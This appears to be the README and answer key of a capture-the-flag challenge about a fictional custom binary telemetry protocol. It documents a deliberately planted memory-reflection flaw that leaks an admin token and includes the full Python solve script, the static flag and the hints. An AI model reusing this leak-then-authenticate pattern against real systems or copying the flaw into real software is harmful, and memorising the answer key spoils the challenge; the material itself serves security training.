# Challenge 10: Chrono-Telemetry Stream

## 1. Challenge Overview & Quick Reference

| Attribute | Value |
|---|---|
| **Challenge Name** | Chrono-Telemetry Stream |
| **Directory** | `10-chrono-telemetry` |
| **Category** | Protocol Forensics / Binary Deserialization / Zero-Copy Memory Reflection |
| **Difficulty** | Hard (Stage 2) |
| **Target Solve Time** | ~15–20 minutes |
| **Connection** | TCP port `:8043` (Custom Binary Protocol) |
| **Default Static Flag** | `YUVA{z3r0_c0py_t3l3m3try_r3fl3ct10n_d00m_c0r3_8492}` |
| **Dynamic Env Vars** | `FLAG` (flag override), `PORT` (port override, default 8043) |
| **Handouts** | `handouts/chrono_client.py`, `handouts/chrono_capture.pcap` |

---

## 2. Clear Objective

The player must analyze the proprietary zero-copy binary streaming protocol `CHRONO-STREAM/3.1` operating on TCP port 8043, exploit a memory reflection vulnerability in the diagnostic telemetry packet parser to leak the active 16-byte administrative authentication token, craft an authenticated administrative dispatch packet with command `0x1337` (`CHRONO_DRAIN_CORE`), collapse Doom's temporal displacement reactor, and extract the master core flag.

The flag is strictly stored in `/flag.txt` inside the container and only emitted upon successful dispatch of the `CHRONO_DRAIN_CORE` command accompanied by the valid active admin token.

---

## 3. Architecture & Story ("Vulnerability First")

### The Story
At the epicentre of Mount Hauberk stands Doctor Doom's crowning achievement: the Chrono-Displacement Core. The reactor broadcasts real-time telemetry over a custom zero-copy binary protocol (`CHRONO-STREAM/3.1`). While standard commands are unprivileged, critical overrides require an ephemeral 16-byte admin session token held in reactor memory.

### Intended Technical Concept
```
[Client TCP Connection (:8043)]
              │
              ▼
[Step 1: Probe Diagnostics Memory Leak]
Transmits DiagnosticsQuery:
- Type: 0x0002
- Query ID: 0x1337
- Reflection Mask: 0x80000010 (Bit 31 set | Offset 16)
              │
              ▼
[Server Zero-Copy Buffer Reflection Flaw]
The parser reflects internal memory buffer: leaks adjacent 16-byte Admin Token!
              │
              ▼
[Step 2: Construct Authenticated Admin Command]
- Type: 0x00A0 (AdminCommand)
- Command ID: 0x1337 (CHRONO_DRAIN_CORE)
- Admin Token: [Leaked 16-byte capsule]
              │
              ▼
[Server Verifies Token & Executes Core Drain]
              │
              ▼
[Temporal Reactor Collapses ──► Output Flag: FLAG{...}]
```

1. **Protocol Framing (16-byte Big-Endian Header)**:
   - `Magic`: 4 bytes (`b"CHRN"`)
   - `Version`: 2 bytes (`0x0301`)
   - `TypeID`: 2 bytes (`0x0001` Ping, `0x0002` Diagnostics, `0x00A0` Admin, `0x00FF` Response)
   - `PayloadLength`: 4 bytes (`uint32`)
   - `CRC32`: 4 bytes (`zlib.crc32(payload)`)
2. **The Reflection Vulnerability**: In `DiagnosticsQuery`, setting bit 31 (`0x80000000`) of the flag word instructs the diagnostics serializer to echo adjacent context memory for diagnostics tracking. Setting offset `16` (`0x80000010`) extracts the server's session token capsule.
3. **Core Drain Authorization**: `AdminCommand` (`0x00A0`) accepts `[command_id: 2 bytes] [admin_token: 16 bytes]`. Supplying the leaked token validates the execution and returns the flag.

---

## 4. How to Run on Any System (Quick Spin-Up)

### 1. Build and Start the Container
```bash
cd 10-chrono-telemetry
docker compose up -d --build
```

### 2. Verify Port & Access
```bash
# Verify TCP listener on port 8043
nc -z -v 127.0.0.1 8043
```

### 3. Spin Up with Custom Dynamic Flag
```bash
FLAG="FLAG{custom_dynamic_chrono_stream_flag_2222}" docker compose up -d --build
```

### 4. Standalone Execution (Without Docker)
```bash
python3 src/chrono_server.py
```

### 5. Teardown
```bash
docker compose down
```

---

## 5. Progressive Hints

- **Hint 1 (PCAP Inspection)**: Open `handouts/chrono_capture.pcap`. Filter for TCP. Inspect the packet structures starting with `CHRN\x03\x01`. Note the CRC32 checksum in bytes 12–15 of the header.
- **Hint 2 (Diagnostics Serialization Flaw)**: Review `handouts/chrono_client.py`. Look at the `DiagnosticsQuery` structure: it has a query ID and a 32-bit flags field. What happens if you activate flag bit 31 (`0x80000000`)?
- **Hint 3 (Admin Command Execution)**: The diagnostics response echoes back internal memory bytes containing the 16-byte admin token. Use that token in an `AdminCommand` (`0x00A0`) packet with command ID `0x1337`.

---

## 6. Step-by-Step Intended Solve Path

1. **Craft Packet Serialization Utility**:
   Header is `struct.pack(">4sHHII", b"CHRN", 0x0301, type_id, len(payload), crc32)`.
2. **Leak Admin Token**:
   Send `DiagnosticsQuery` with payload `struct.pack(">II", 0x1337, 0x80000010)`.
   Parse `TYPE_RESPONSE` (0x00FF); extract bytes 8 through 24 of the payload as `admin_token`.
3. **Dispatch `CHRONO_DRAIN_CORE`**:
   Build `AdminCommand` (0x00A0) payload:
   ```python
   admin_payload = struct.pack(">H", 0x1337) + admin_token
   ```
4. **Capture the Flag**:
   The server returns the temporal core shutdown transcript containing the flag.

---

## 7. Exact Solution Script Code & Execution

Run the automated Python exploit script from the challenge directory:

```bash
python3 solution/solve.py 127.0.0.1 8043
```

### Complete Exploit Script (`solution/solve.py`):
```python
#!/usr/bin/env python3
"""
Automated solve script for Challenge 10: Chrono-Telemetry Stream
Exploits zero-copy buffer reflection in DiagnosticsQuery to leak the active 16-byte
administrative token, transmits authenticated CHRONO_DRAIN_CORE command, and captures flag.
"""
import sys
import socket
import struct
import zlib

MAGIC = b"CHRN"
VERSION = 0x0301

TYPE_DIAGNOSTICS = 0x0002
TYPE_ADMIN_CMD   = 0x00A0
TYPE_RESPONSE    = 0x00FF

CMD_DRAIN_CORE   = 0x1337

def pack_packet(type_id, payload):
    crc = zlib.crc32(payload) & 0xFFFFFFFF
    header = struct.pack(">4sHHII", MAGIC, VERSION, type_id, len(payload), crc)
    return header + payload

def recv_packet(s):
    header = s.recv(16)
    if len(header) < 16:
        return None, None
    magic, ver, type_id, plen, crc = struct.unpack(">4sHHII", header)
    payload = b""
    while len(payload) < plen:
        chunk = s.recv(plen - len(payload))
        if not chunk:
            break
        payload += chunk
    return type_id, payload

def solve(host="127.0.0.1", port=8043):
    print(f"[*] Connecting to Chrono-Telemetry Daemon at {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))

    # Step 1: Leak Admin Auth Token via buffer reflection at offset 16
    # Reflection mask = 0x80000000 | 16
    reflection_flag = 0x80000000 | 16
    diag_payload = struct.pack(">II", 0x1337, reflection_flag)
    
    print("[*] Transmitting memory reflection probe to leak admin session capsule...")
    s.sendall(pack_packet(TYPE_DIAGNOSTICS, diag_payload))

    t, resp_payload = recv_packet(s)
    if not resp_payload or len(resp_payload) < 24:
        print("[-] Failed to leak admin token from diagnostics reflection.")
        s.close()
        return None

    admin_token = resp_payload[8:24]
    print(f"[+] Leaked Active Admin Token (16 bytes): {admin_token}")

    # Step 2: Issue CHRONO_DRAIN_CORE command (0x1337) with leaked token
    admin_cmd_payload = struct.pack(">H", CMD_DRAIN_CORE) + admin_token
    print("[*] Transmitting authenticated CHRONO_DRAIN_CORE command...")
    s.sendall(pack_packet(TYPE_ADMIN_CMD, admin_cmd_payload))

    t, resp_payload = recv_packet(s)
    response_text = resp_payload.decode("utf-8", errors="ignore")
    print(f"[+] Server Response:\n{response_text}")

    for line in response_text.splitlines():
        if "FLAG{" in line:
            flag = line[line.find("FLAG{"):].split()[0]
            print(f"[+] Captured Flag: {flag}")
            s.close()
            return flag

    s.close()
    return None

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 8043
    solve(h, p)
```

---

## 8. CTF Quality, Security & Anti-Shortcut Audit

- **Clear Objective**: Reverse binary packet formats, exploit memory reflection to leak admin token, and execute core drain.
- **No Unintended Shortcuts**:
  - The PCAP handout contains diagnostic samples but does not contain the flag.
  - The token is randomized in daemon memory at boot and unique per instance.
  - Commands sent without the valid token return `0x01` (AUTH_DENIED).
- **Challenge Isolation**: Runs as unprivileged user `ctf` with strictly confined socket permissions.
- **Resetability**: Daemon is stateless with respect to connection lifecycle.
- **Performance**: High throughput binary parser processing commands in <1ms.

---

## 9. Author & Admin Notes

- Simulates real-world proprietary SCADA/telemetry streaming vulnerabilities.
- Complete reference guide available in [GUIDE.md](file:///home/alucard/ch-j/10-chrono-telemetry/GUIDE.md).
